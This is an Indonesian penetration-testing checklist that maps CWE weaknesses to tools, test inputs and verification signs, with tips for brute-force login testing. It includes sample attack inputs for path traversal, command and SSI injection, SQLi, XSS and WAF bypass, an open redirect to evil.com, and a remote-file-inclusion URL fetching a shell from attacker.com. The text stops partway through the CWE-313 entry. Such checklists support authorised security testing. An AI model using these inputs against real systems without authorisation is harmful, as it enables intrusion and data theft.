# 📋 Referensi CWE Classifications & Verification Checklist

Dokumen ini berisi panduan untuk melakukan verifikasi kerentanan berdasarkan **CWE Classifications** yang didefinisikan oleh user. Dokumen ini juga menjelaskan cara menghindari **False Positives** pada pengujian login/bruteforce dan memberikan daftar tool spesifik untuk setiap CWE.

> ⚠️ **DISCLAIMER**: Pengujian keamanan hanya boleh dilakukan pada target yang sah dan memiliki otorisasi tertulis (Rules of Engagement).

---

## 🛠️ Panduan Menghindari False Positives dalam Credential Testing

False positive pada brute-force login (seperti saat semua password dilaporkan sukses) biasanya terjadi karena target mengembalikan status **HTTP 200 OK** untuk login yang gagal dan sukses. Berikut cara memperbaikinya:

1. **Gunakan Karakteristik Halaman Kegagalan (Failure String)**:
   * **Mengapa**: Sebagian besar form login menampilkan pesan error seperti `"Incorrect username or password"`, `"Gagal"`, atau `"Invalid"`.
   * **Solusi**: Konfigurasikan tool untuk mendeteksi string kegagalan ini. Pada **Hydra**, gunakan parameter `:F=incorrect` (atau pesan kegagalan spesifik target). Pada **FFUF**, gunakan `-mr "incorrect"` atau `-fc 401`.
2. **Gunakan Karakteristik Halaman Keberhasilan (Success String / Redirect)**:
   * **Mengapa**: Jika login berhasil, aplikasi biasanya melakukan redirect (302) ke dashboard atau menampilkan kata `"Dashboard"`, `"Welcome"`, atau `"Sign Out"`.
   * **Solusi**: Konfigurasikan tool untuk mencari status redirect (misal, filter status HTTP `-mc 302`) atau string unik halaman dashboard.
3. **Analisis Panjang Response (Content Length)**:
   * **Mengapa**: Jika pesan error sangat dinamis tetapi ukuran halaman error selalu konstan (misal: 1024 bytes), maka halaman login sukses akan memiliki ukuran yang berbeda signifikan.
   * **Solusi**: Gunakan filter ukuran pada FFUF (`-fs 1024`) untuk menyembunyikan semua response dengan panjang halaman error.

---

## 📋 DAFTAR CHECKLIST CWE & PENGUJIAN TOOLS

### 1. Path Traversal & Access Control

- [ ] **CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')**
  * **Tool**: `ffuf`, `curl`
  * **Pengujian**: Fuzzing parameter file path dengan payload traversal (seperti `../../etc/passwd`).
  * **Verification**: Cek apakah respons mengandung pola isi file sistem (seperti `root:x:0:0:`).

- [ ] **CWE-23: Relative Path Traversal**
  * **Tool**: `ffuf`
  * **Pengujian**: Fuzzing menggunakan path relatif (`..//..//etc/passwd`).
  * **Verification**: Deteksi response string unik di sistem seperti `[boot loader]` untuk Windows atau `root:` untuk Linux.

- [ ] **CWE-35: Path Traversal: '... /... //'**
  * **Tool**: `curl`, `ffuf`
  * **Pengujian**: Uji bypass filter penulisan string traversal ganda (`..././.../`).
  * **Verification**: Uji apakah server melakukan normalisasi karakter yang salah.

- [ ] **CWE-59: Improper Link Resolution Before File Access ('Link Following')**
  * **Tool**: `terminal` (perintah sistem)
  * **Pengujian**: Membaca file melalui symlink yang mengarah ke file sensitif.
  * **Verification**: Verifikasi jika symlink dapat diakses melalui web root.

- [ ] **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**
  * **Tool**: `nuclei`, `whatweb`, `curl`
  * **Pengujian**: Scanning file konfigurasi yang terekspos (seperti `.git/`, `.env`, `config.json`).
  * **Verification**: Cari kata kunci sensitif (seperti `DB_PASSWORD`, `API_KEY`).

- [ ] **CWE-21: Exposure of Sensitive Information Through Sent Data**
  * **Tool**: `Burp Suite`, `curl`
  * **Pengujian**: Cek parameter respons atau cookies yang memuat data internal.
  * **Verification**: Analisis respons HTTP untuk data sensitif seperti detail query SQL atau stack trace.

- [ ] **CWE-219: Storage of File with Sensitive Data Under Web Root**
  * **Tool**: `ffuf`, `gobuster`
  * **Pengujian**: Scan direktori backup di dalam web root (seperti `backup.zip`, `db.sql`).
  * **Verification**: Lakukan download file untuk memeriksa integritas data sensitif.

- [ ] **CWE-264: Permissions, Privileges, and Access Controls**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Akses endpoint administratif tanpa cookie session admin.
  * **Verification**: Respons mengembalikan `200 OK` dengan konten administratif (Bypass Access Control).

- [ ] **CWE-275: Permission Issues**
  * **Tool**: `curl`, `Burp Suite`
  * **Pengujian**: Modifikasi header otorisasi untuk mengakses resources milik user lain.
  * **Verification**: Server mengizinkan request meskipun hak akses tidak mencukupi.

- [ ] **CWE-276: Incorrect Default Permissions**
  * **Tool**: `nmap`
  * **Pengujian**: Port scanning untuk mengecek permissions folder publik atau NFS share yang terbuka.
  * **Verification**: Hubungkan ke share folder tanpa autentikasi.

- [ ] **CWE-284: Improper Access Control**
  * **Tool**: `Burp Suite`, `curl`
  * **Pengujian**: Ganti metode HTTP (misal: GET ke POST) pada endpoint sensitif.
  * **Verification**: Endpoint dapat diakses secara tidak sah.

- [ ] **CWE-285: Improper Authorization**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim ID parameter milik user lain (IDOR) pada aksi POST/PUT.
  * **Verification**: Aksi berhasil memodifikasi data milik target tanpa otorisasi.

- [ ] **CWE-352: Cross-Site Request Forgery (CSRF)**
  * **Tool**: `Burp Suite` (CSRF PoC Generator)
  * **Pengujian**: Hapus/ubah parameter token anti-CSRF pada request POST yang sensitif.
  * **Verification**: Request tetap dieksekusi server meskipun token salah atau hilang.

- [ ] **CWE-359: Exposure of Private Personal Information to an Unauthorized Actor**
  * **Tool**: `curl`
  * **Pengujian**: Query endpoint profil dengan id acak tanpa token otorisasi yang valid.
  * **Verification**: Data PII (alamat email, nomor telepon) bocor ke pihak luar.

- [ ] **CWE-377: Insecure Temporary File**
  * **Tool**: `gobuster`, `ffuf`
  * **Pengujian**: Enumerasi file sementara seperti `/tmp/` yang terekspos di web root.
  * **Verification**: Memastikan file sementara dapat dibaca publik.

- [ ] **CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Amati jika request dari browser membocorkan URL internal melalui referer header.
  * **Verification**: Data internal diteruskan ke domain eksternal.

- [ ] **CWE-425: Direct Request ('Forced Browsing')**
  * **Tool**: `ffuf`, `gobuster`
  * **Pengujian**: Brute force mencari halaman admin/dashboard tersembunyi (seperti `/admin_portal_new`).
  * **Verification**: Halaman admin dapat diakses langsung tanpa login.

- [ ] **CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')**
  * **Tool**: `curl`
  * **Pengujian**: Uji SSRF atau pemanfaatan proxy untuk mengakses host internal.
  * **Verification**: Target bertindak sebagai perantara yang mengeksekusi perintah kita ke backend.

- [ ] **CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere**
  * **Tool**: `curl`
  * **Pengujian**: Uji error handling dengan menginput karakter ilegal untuk memaksa tampilan error server.
  * **Verification**: Stack trace mengungkap OS, runtime version, dan absolute file path server.

- [ ] **CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory**
  * **Tool**: `gobuster`, `ffuf`
  * **Pengujian**: Memindai file log publik (seperti `/error.log`, `/access.log`, `/debug.log`).
  * **Verification**: Menemukan log session token atau kredensial di dalam file tersebut.

- [ ] **CWE-540: Inclusion of Sensitive Information in Source Code**
  * **Tool**: Browser Developer Tools, `curl`
  * **Pengujian**: Periksa komentar HTML atau file JavaScript yang di-load di client-side.
  * **Verification**: Menemukan kredensial hardcoded atau API key di script front-end.

- [ ] **CWE-548: Exposure of Information Through Directory Listing**
  * **Tool**: `curl`, `nmap`
  * **Pengujian**: Akses direktori tanpa file indeks (seperti `/images/`, `/uploads/`).
  * **Verification**: Server menampilkan daftar isi direktori secara visual (Index of /).

- [ ] **CWE-552: Files or Directories Accessible to External Parties**
  * **Tool**: `curl`
  * **Pengujian**: Request file konfigurasi server sensitif secara langsung (seperti `/WEB-INF/web.xml`).
  * **Verification**: Konten file konfigurasi internal berhasil didownload.

- [ ] **CWE-566: Authorization Bypass Through User-Controlled SQL Primary Key**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Ganti ID primary key pada query parameter (IDOR) untuk melihat data record SQL.
  * **Verification**: Database menampilkan record milik user lain tanpa validasi otorisasi.

- [ ] **CWE-601: URL Redirection to Untrusted Site ('Open Redirect')**
  * **Tool**: `curl` (periksa Header Location)
  * **Pengujian**: Modifikasi parameter redirect (`?next=https://evil.com`).
  * **Verification**: Header respons menunjukkan `Location: https://evil.com`.

- [ ] **CWE-639: Authorization Bypass Through User-Controlled Key**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Mengubah ID user di header HTTP atau body JSON pada API.
  * **Verification**: Data profil berhasil dimodifikasi menggunakan token user lain.

- [ ] **CWE-651: Exposure of WSDL File Containing Sensitive Information**
  * **Tool**: `ffuf`, `gobuster`
  * **Pengujian**: Enumerasi file deskripsi SOAP service (`?wsdl`).
  * **Verification**: WSDL file mengungkap endpoint fungsi internal dan parameter parameternya.

- [ ] **CWE-668: Exposure of Resource to Wrong Sphere**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Amati jika aset privat dikirimkan melalui channel publik yang tidak terenkripsi.
  * **Verification**: Dokumen rahasia di-host di URL publik tanpa hak akses.

- [ ] **CWE-706: Use of Incorrectly-Resolved Name or Reference**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Memanipulasi nama domain internal pada request header untuk mengelabui router internal.
  * **Verification**: Router salah menerjemahkan path ke server privat yang berbeda.

- [ ] **CWE-862: Missing Authorization**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Mengirimkan parameter POST yang mengubah password user lain tanpa session token yang valid.
  * **Verification**: Perubahan data tereksekusi tanpa otorisasi.

- [ ] **CWE-863: Incorrect Authorization**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Mengirim request berisikan data dengan privilege level admin menggunakan session user biasa.
  * **Verification**: Aksi admin berhasil dilakukan oleh user non-admin.

- [ ] **CWE-913: Improper Control of Dynamically-Managed Code Resources**
  * **Tool**: `payload_generator.py` (tipe `ssti`)
  * **Pengujian**: Uji injeksi ke engine parser template untuk memanipulasi file code resource.
  * **Verification**: Eksekusi code dinamis di server berhasil.

- [ ] **CWE-922: Insecure Storage of Sensitive Information**
  * **Tool**: `sqlmap` (atau investigasi dump database)
  * **Pengujian**: Mengekstrak data kredensial dari server basis data.
  * **Verification**: Menemukan password disimpan dalam bentuk plain text atau hash lemah tanpa salt.

- [ ] **CWE-1275: Sensitive Cookies with Improper SameSite Attributes**
  * **Tool**: `curl`, `Burp Suite`
  * **Pengujian**: Cek respons HTTP header `Set-Cookie`.
  * **Verification**: Tag `SameSite` tidak diset atau bernilai `None` tanpa attribute `Secure`.

---

### 2. Cryptography & Encryption Strength

- [ ] **CWE-261: Weak Encoding for Password**
  * **Tool**: `john`, `hashcat`
  * **Pengujian**: Crack hash password dari database dump.
  * **Verification**: Menemukan algoritma hash lemah seperti MD5, Base64 (encoding), atau SHA1 tanpa salt.

- [ ] **CWE-296: Improper Following of a Certificate's Chain of Trust**
  * **Tool**: `nmap` (--script ssl-cert)
  * **Pengujian**: Verifikasi rantai sertifikat SSL/TLS.
  * **Verification**: Sertifikat expired, self-signed, atau root CA tidak dikenal tetap diterima oleh client.

- [ ] **CWE-310: Cryptographic Issues**
  * **Tool**: `nmap`
  * **Pengujian**: Analisis cipher suites TLS yang digunakan server.
  * **Verification**: Server mengizinkan koneksi menggunakan ciphers usang (DES, RC4).

- [ ] **CWE-319: Cleartext Transmission of Sensitive Information**
  * **Tool**: Wireshark, `tcpdump`
  * **Pengujian**: Amati transmisi data login/transaksi di jaringan.
  * **Verification**: Protokol yang digunakan HTTP (port 80) bukan HTTPS (port 443). Kredensial dapat dibaca langsung.

- [ ] **CWE-321: Use of Hard-coded Cryptographic Key**
  * **Tool**: `grep`, `nuclei`
  * **Pengujian**: Cari kunci enkripsi statis di repositori kode publik atau file JS client-side.
  * **Verification**: Menemukan API key, JWT secret, atau SSH key yang tertulis langsung dalam kode.

- [ ] **CWE-322: Key Exchange without Entity Authentication**
  * **Tool**: `nmap`
  * **Pengujian**: Analisis konfigurasi SSL/TLS pada fase jabat tangan (handshake).
  * **Verification**: Tidak ada validasi entitas pengirim selama proses penukaran kunci.

- [ ] **CWE-323: Reusing a Nonce, Key Pair in Encryption**
  * **Tool**: Analisis matematis dari output kriptografi (Custom Script)
  * **Pengujian**: Lakukan request enkripsi berulang untuk input yang sama.
  * **Verification**: Menemukan nilai initialization vector (IV) atau nonce berulang untuk pesan berbeda.

- [ ] **CWE-324: Use of a Key Past Its Expiration Date**
  * **Tool**: `nmap` (--script ssl-cert)
  * **Pengujian**: Uji penggunaan sertifikat SSL atau key API yang sudah expired.
  * **Verification**: API/koneksi TLS tetap berjalan meskipun kunci sudah kedaluwarsa.

- [ ] **CWE-325: Missing Required Cryptographic Step**
  * **Tool**: Analisis alur enkripsi kode
  * **Pengujian**: Pengecekan implementasi kode apakah enkripsi di-bypass pada kondisi tertentu.
  * **Verification**: Data sensitif disimpan tanpa melalui proses enkripsi yang utuh.

- [ ] **CWE-326: Inadequate Encryption Strength**
  * **Tool**: `nmap`
  * **Pengujian**: Periksa panjang kunci enkripsi SSL/TLS (RSA < 2048 bit).
  * **Verification**: Server menerima ukuran bit enkripsi yang lemah dan rentan brute-force.

- [ ] **CWE-327: Use of a Broken or Risky Cryptographic Algorithm**
  * **Tool**: `nmap`, `john`
  * **Pengujian**: Mengidentifikasi penggunaan enkripsi usang seperti MD5, RC4, Blowfish.
  * **Verification**: Algoritma kriptografi yang dipakai telah terbukti memiliki celah keamanan fatal secara akademis.

- [ ] **CWE-329: Not Using a Random IV with CBC Mode**
  * **Tool**: Analisis cipher block mode
  * **Pengujian**: Enkripsi payload berulang menggunakan CBC mode.
  * **Verification**: Menemukan nilai IV statis/tidak acak yang membuat ciphertext rentan didekripsi.

- [ ] **CWE-330: Use of Insufficiently Random Values**
  * **Tool**: Analisis token generator
  * **Pengujian**: Request token session berulang kali dan ukur entropinya.
  * **Verification**: Menemukan pola prediksi token (karena menggunakan fungsi random biasa bukan CSPRNG).

- [ ] **CWE-331: Insufficient Entropy**
  * **Tool**: Analisis kriptografi
  * **Pengujian**: Menghitung variasi nilai acak yang di-generate.
  * **Verification**: Range nilai acak terlalu kecil sehingga mudah ditebak secara brute-force.

- [ ] **CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG)**
  * **Tool**: Review Source Code
  * **Pengujian**: Cek apakah PRNG menggunakan static seed (seperti waktu server per detik).
  * **Verification**: Nilai acak yang di-generate dapat diprediksi jika waktu eksekusi diketahui.

- [ ] **CWE-336: Same Seed in Pseudo-Random Number Generator (PRNG)**
  * **Tool**: Review Source Code
  * **Pengujian**: Periksa apakah inisialisasi generator angka acak menggunakan seed konstan.
  * **Verification**: Output PRNG selalu sama setiap kali program dijalankan.

- [ ] **CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)**
  * **Tool**: Review Source Code
  * **Pengujian**: Cek apakah nilai seed hanya berbasis pada variabel yang mudah ditebak (seperti PID proses).
  * **Verification**: Penyerang dapat merekonstruksi urutan angka acak.

- [ ] **CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)**
  * **Tool**: Review Source Code
  * **Pengujian**: Cari penggunaan library random standar bawaan bahasa pemrograman (seperti `rand()`, `Math.random()`).
  * **Verification**: Penggunaan PRNG non-kriptografis untuk token sesi atau enkripsi.

- [ ] **CWE-340: Generation of Predictable Numbers or Identifiers**
  * **Tool**: `ffuf` (fuzzing token)
  * **Pengujian**: Analisis nomor order, ID user, atau ID faktur.
  * **Verification**: Pola ID bersifat sequential (`1001`, `1002`, `1003`), memudahkan enumeration.

- [ ] **CWE-347: Improper Verification of Cryptographic Signature**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Modifikasi payload JWT lalu kirimkan ke server tanpa mengubah signature-nya.
  * **Verification**: Server memproses data tersebut (tidak memverifikasi keabsahan signature).

- [ ] **CWE-523: Unprotected Transport of Credentials**
  * **Tool**: `curl`, `Burp Suite`
  * **Pengujian**: Kirim request POST kredensial login melalui koneksi HTTP (port 80).
  * **Verification**: Login tetap diproses tanpa paksaan enkripsi (tidak ada pengalihan otomatis ke HTTPS).

- [ ] **CWE-720: OWASP Top Ten 2007 Category A9 - Insecure Communications**
  * **Tool**: `nmap`, `curl`
  * **Pengujian**: Pengecekan transmisi data sensitif tanpa SSL/TLS.
  * **Verification**: Data rahasia mengalir via cleartext HTTP.

- [ ] **CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')**
  * **Tool**: `nmap`
  * **Pengujian**: Paksa server TLS menggunakan protokol terdegradasi (misal, SSLv3 / TLS 1.0).
  * **Verification**: Server menyetujui jabat tangan TLS versi rendah yang rentan terhadap serangan POODLE/BEAST.

- [ ] **CWE-759: Use of a One-Way Hash without a Salt**
  * **Tool**: `john`, `hashcat`
  * **Pengujian**: Crack hash password dari database target.
  * **Verification**: Database menyimpan hash identik untuk password yang sama (menunjukkan ketiadaan Salt).

- [ ] **CWE-760: Use of a One-Way Hash with a Predictable Salt**
  * **Tool**: Review Source Code
  * **Pengujian**: Periksa logika hashing database.
  * **Verification**: Salt yang digunakan bersifat konstan (misal, static string) atau mudah ditebak (username).

- [ ] **CWE-780: Use of RSA Algorithm without OAEP**
  * **Tool**: Review Source Code / Binary Analysis
  * **Pengujian**: Cari parameter inisialisasi padding enkripsi RSA.
  * **Verification**: Penggunaan padding PKCS#1 v1.5 yang rentan terhadap padding oracle attacks.

- [ ] **CWE-818: Insufficient Transport Layer Protection**
  * **Tool**: `nmap`
  * **Pengujian**: Scan cipher suite enkripsi transit data.
  * **Verification**: Kurangnya dukungan TLS modern (v1.3) pada server penampung data sensitif.

- [ ] **CWE-916: Use of Password Hash With Insufficient Computational Effort**
  * **Tool**: `john`, `hashcat`
  * **Pengujian**: Uji kecepatan brute-force hash password target.
  * **Verification**: Algoritma hashing menggunakan fungsi cepat seperti MD5/SHA256, bukan fungsi lambat yang aman (bcrypt/Argon2).

---

### 3. Input Validation & Injection

- [ ] **CWE-20: Improper Input Validation**
  * **Tool**: `ffuf`, `curl`
  * **Pengujian**: Kirim input dengan tipe data, panjang, atau format ilegal ke server.
  * **Verification**: Server langsung memproses data tanpa validasi (menyebabkan error internal atau inkonsistensi data).

- [ ] **CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')**
  * **Tool**: `payload_generator.py`
  * **Pengujian**: Kirim karakter pembatas input (seperti `;`, `|`, `'`, `"`, `\n`) ke input form.
  * **Verification**: Database atau sistem mengeksekusi karakter tersebut sebagai instruksi baru.

- [ ] **CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Masukkan karakter meta untuk database ke dalam format data XML/JSON.
  * **Verification**: Struktur format data hancur atau terurai di level parser backend.

- [ ] **CWE-77: Improper Neutralization of Special Elements is used in a Command ('Command Injection')**
  * **Tool**: `payload_generator.py` (tipe `cmdi`)
  * **Pengujian**: Kirim operator perintah OS (seperti `&&`, `||`, `;`) ke input parameter.
  * **Verification**: Perintah sistem operasi (misal `whoami`, `id`) tereksekusi di server.

- [ ] **CWE-78: OS Command Injection**
  * **Tool**: `payload_generator.py` (tipe `cmdi`)
  * **Pengujian**: Kirim payload command injection spesifik OS ke target.
  * **Verification**: Hasil output perintah OS (seperti isi direktori) ditampilkan di response browser.

- [ ] **CWE-79: Cross-site Scripting (XSS)**
  * **Tool**: `payload_generator.py` (tipe `xss`), `ffuf`
  * **Pengujian**: Kirim payload tag script XSS ke parameter web.
  * **Verification**: Browser mengeksekusi JavaScript kita (muncul popup `alert`).

- [ ] **CWE-80: Basic XSS**
  * **Tool**: `curl`
  * **Pengujian**: Kirim tag HTML sederhana (`<b>`, `<h1>`, `<a>`) ke input form.
  * **Verification**: HTML ter-render secara visual di halaman web tanpa sanitasi.

- [ ] **CWE-83: Improper Neutralization of Script in Attributes in a Web Page**
  * **Tool**: `payload_generator.py` (context `attribute`)
  * **Pengujian**: Kirim payload event handler XSS (`" onmouseover="alert(1)`) ke attribute value.
  * **Verification**: JavaScript terpicu ketika browser mendeteksi aksi user pada elemen tersebut.

- [ ] **CWE-87: Improper Neutralization of Alternate XSS Syntax**
  * **Tool**: `payload_generator.py` (context `waf_bypass`)
  * **Pengujian**: Gunakan alternatif sintaks JS (seperti backtick, method `obfuscation`, base64 wrapper).
  * **Verification**: JavaScript tereksekusi meskipun filter kata kunci `script` atau parentesis `()` aktif.

- [ ] **CWE-88: Argument Injection**
  * **Tool**: `curl`
  * **Pengujian**: Kirim input flag command-line (seperti `--config`, `-o`) ke backend shell executor.
  * **Verification**: Aplikasi merubah perilakunya berdasarkan opsi argument yang kita injeksikan.

- [ ] **CWE-89: SQL Injection (SQLi)**
  * **Tool**: `sqlmap`, `payload_generator.py` (tipe `sqli`)
  * **Pengujian**: Fuzzing parameter dengan karakter `'`, `"`, `OR 1=1`.
  * **Verification**: Aplikasi menghasilkan error SQL database atau menampilkan record data tak terfilter.

- [ ] **CWE-90: LDAP Injection**
  * **Tool**: `payload_generator.py` (tipe `ldap`)
  * **Pengujian**: Kirim karakter filter LDAP (seperti `*`, `(`, `)`, `&`, `|`).
  * **Verification**: Bypass filter otentikasi login LDAP atau ekstraksi atribut struktur direktori.

- [ ] **CWE-91: XML Injection (aka Blind XPath Injection)**
  * **Tool**: `payload_generator.py` (tipe `xxe`)
  * **Pengujian**: Injeksikan parameter XPath query (`' or 1=1 or ''='`) ke form pencarian berbasis XML.
  * **Verification**: Logika query XPath terdistorsi, menghasilkan output valid tanpa otorisasi.

- [ ] **CWE-93: CRLF Injection**
  * **Tool**: `payload_generator.py` (tipe `crlf`)
  * **Pengujian**: Injeksikan karakter pembatas baris (`%0d%0a` / `\r\n`) ke HTTP request header.
  * **Verification**: Respons HTTP memuat header baru (misal `Set-Cookie`) atau membelah respons (response splitting).

- [ ] **CWE-94: Code Injection**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Injeksikan sintaks script bahasa pemrograman (PHP, Python, ASP) ke variabel dinamis backend.
  * **Verification**: Perintah kode backend tereksekusi secara remote (Remote Code Execution - RCE).

- [ ] **CWE-95: Eval Injection**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Cari fungsi `eval()` di backend yang menerima input user secara mentah.
  * **Verification**: Eksekusi perintah matematika atau logika kode baru sukses.

- [ ] **CWE-96: Static Code Injection**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Tulis kode pemrograman langsung ke dalam file konfigurasi lokal target.
  * **Verification**: File konfigurasi mengeksekusi muatan kode baru saat di-load oleh server.

- [ ] **CWE-97: Server-Side Includes (SSI) Within a Web Page**
  * **Tool**: `payload_generator.py` (tipe `ssi`)
  * **Pengujian**: Kirim payload SSI directives (seperti `<!--#exec cmd="whoami" -->`).
  * **Verification**: Output perintah sistem operasi tampil di halaman HTML yang di-generate server.

- [ ] **CWE-98: PHP Remote File Inclusion (RFI)**
  * **Tool**: `curl`
  * **Pengujian**: Kirim URL server luar (`?file=http://attacker.com/shell.txt`) ke parameter file inclusion PHP.
  * **Verification**: Server target mengeksekusi script PHP dari server luar tersebut.

- [ ] **CWE-99: Resource Injection**
  * **Tool**: `curl`
  * **Pengujian**: Manipulasi path resource server (seperti IP port database atau path internal file log).
  * **Verification**: Server merujuk ke resource eksternal atau memicu internal service redirection.

- [ ] **CWE-100: Input Validation Issues (Deprecated catch-all)**
  * **Tool**: `ffuf`
  * **Pengujian**: Fuzzing input form menggunakan karakter khusus (non-printable, bad chars).
  * **Verification**: Memastikan penanganan input yang aman di seluruh level aplikasi.

- [ ] **CWE-113: HTTP Response Splitting**
  * **Tool**: `payload_generator.py` (tipe `crlf`)
  * **Pengujian**: Injeksikan sequence CRLF ganda (`%0d%0a%0d%0a`) diikuti payload HTML/JS.
  * **Verification**: Server memecah response header dan menulis payload kita langsung ke response body.

- [ ] **CWE-116: Improper Encoding or Escaping of Output**
  * **Tool**: `curl`
  * **Pengujian**: Kirim karakter HTML dan periksa apakah respons melakukan encoding (misal: `<` menjadi `&lt;`).
  * **Verification**: Karakter meta muncul mentah di halaman web, memicu XSS.

- [ ] **CWE-138: Improper Neutralization of Special Elements**
  * **Tool**: `ffuf`
  * **Pengujian**: Input karakter ASCII kontrol atau format string.
  * **Verification**: Server gagal menormalisasi input sebelum diproses.

- [ ] **CWE-184: Incomplete List of Disallowed Inputs**
  * **Tool**: `payload_generator.py` (tipe `waf_bypass`)
  * **Pengujian**: Uji filter blacklist kata kunci (seperti bypass kata `SELECT` dengan `SEL/**/ECT` atau `SeLeCt`).
  * **Verification**: Target memblokir string mentah tapi kecolongan saat string dimodifikasi (blacklist bypass).

- [ ] **CWE-470: Unsafe Reflection**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Masukkan nama Class backend internal ke dalam parameter input API.
  * **Verification**: Aplikasi menginstansiasi Class tersebut secara tidak aman, memicu RCE.

- [ ] **CWE-471: Modification of Assumed-Immutable Data (MAID)**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirimkan parameter internal (seperti `isAdmin=true`) pada request registrasi user.
  * **Verification**: Akun user berhasil dibuat langsung dengan level Admin.

- [ ] **CWE-564: SQL Injection: Hibernate**
  * **Tool**: `sqlmap`
  * **Pengujian**: Fuzzing input pencarian pada aplikasi berbasis Java Hibernate (HQL).
  * **Verification**: Menghasilkan error HQL syntax yang mengungkap struktur objek entitas database.

- [ ] **CWE-610: Externally Controlled Reference to a Resource in Another Sphere**
  * **Tool**: `curl`
  * **Pengujian**: Input URI lokal (`file:///etc/passwd`) ke API penyedia media/gambar.
  * **Verification**: Server membaca file internal lokal dan menampilkannya kepada penyerang.

- [ ] **CWE-643: XPath Injection**
  * **Tool**: `ffuf` (fuzzing data XML)
  * **Pengujian**: Injeksikan karakter pembatas XPath sintaks (`' or 1=1 or ''='`).
  * **Verification**: Respons menunjukkan data XML diekstrak di luar batasan hak akses normal.

- [ ] **CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Injeksikan payload XSS ke dalam HTTP Header `User-Agent` atau `Referer`.
  * **Verification**: Server menyimpan log header tersebut dan merendernya sebagai script aktif di dashboard admin.

- [ ] **CWE-652: XQuery Injection**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim payload injeksi query XML parser (`' or true() or '`).
  * **Verification**: Hasil ekstraksi query XML melompati skema otorisasi internal.

- [ ] **CWE-917: Expression Language Injection (EL Injection)**
  * **Tool**: `payload_generator.py` (tipe `ssti`)
  * **Pengujian**: Injeksikan ekspresi EL (seperti `${7*7}` atau `#{7*7}`) ke input Java/Spring.
  * **Verification**: Output respons memuat angka `49` (RCE di level JVM).

---

### 4. Authentication, Session & Privilege Management

- [ ] **CWE-73: External Control of File Name or Path**
  * **Tool**: `curl`
  * **Pengujian**: Kirim absolute path `/etc/passwd` ke parameter input download gambar.
  * **Verification**: Sistem mendownload file sistem internal secara langsung.

- [ ] **CWE-183: Permissive List of Allowed Inputs**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Cek validasi ekstensi file upload (seperti kirim `.php5` atau `.phtml` saat `.php` diblokir).
  * **Verification**: File ter-upload dan berhasil dieksekusi server.

- [ ] **CWE-209: Generation of Error Message Containing Sensitive Information**
  * **Tool**: `curl`
  * **Pengujian**: Kirim input ilegal untuk memaksa server menampilkan pesan error.
  * **Verification**: Pesan error menampilkan nama database, tabel, atau file path sistem.

- [ ] **CWE-213: Exposure of Sensitive Information Due to Incompatible Policies**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Akses endpoint API privat melalui client-side request yang tidak dibatasi.
  * **Verification**: Data rahasia bocor di browser console.

- [ ] **CWE-235: Improper Handling of Extra Parameters**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim parameter tambahan (seperti `id=123&id=456` - Parameter Pollution).
  * **Verification**: WAF ter-bypass atau logika server keliru memproses input.

- [ ] **CWE-256: Unprotected Storage of Credentials**
  * **Tool**: `grep`
  * **Pengujian**: Cari file konfigurasi proyek (seperti `.git`, `.env`).
  * **Verification**: Password database ditulis secara plain-text dalam file konfigurasi.

- [ ] **CWE-257: Stocking Passwords in a Recoverable Format**
  * **Tool**: Review database schema
  * **Pengujian**: Lakukan registrasi, lalu cek database entry.
  * **Verification**: Password disimpan menggunakan enkripsi reversibel (bisa didekripsi kembali menjadi plain-text).

- [ ] **CWE-266: Incorrect Privilege Assignment**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Modifikasi parameter role (`role=user` ke `role=admin`) pada registrasi atau profil.
  * **Verification**: User biasa mendapat akses panel administratif.

- [ ] **CWE-269: Improper Privilege Management**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Lakukan login user biasa, lalu paksa akses endpoint admin (`/admin/delete_user`).
  * **Verification**: Aksi tereksekusi tanpa penolakan hak akses dari server.

- [ ] **CWE-280: Improper Handling of Insufficient Permissions or Privileges**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Request resource ber-privilege tinggi dengan token otentikasi level rendah.
  * **Verification**: Server memproses request tanpa memvalidasi level otorisasi minimum.

- [ ] **CWE-311: Missing Encryption of Sensitive Data**
  * **Tool**: Wireshark, `nmap`
  * **Pengujian**: Periksa apakah transmisi data menggunakan HTTP plain-text.
  * **Verification**: Informasi kredensial dikirim tanpa enkripsi SSL/TLS.

- [ ] **CWE-312: Clear Text Storage of Sensitive Information**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Periksa apakah kredensial disimpan langsung di LocalStorage atau session storage client.
  * **Verification**: Token sesi atau password terlihat dalam bentuk plain-text di browser client.

- [ ] **CWE-313: Clear Text Storage in a File or on Disk**
  * **Tool**: `terminal`
  * **Pengujian**: Cek file log sistem atau folder temporary `/tmp/`.
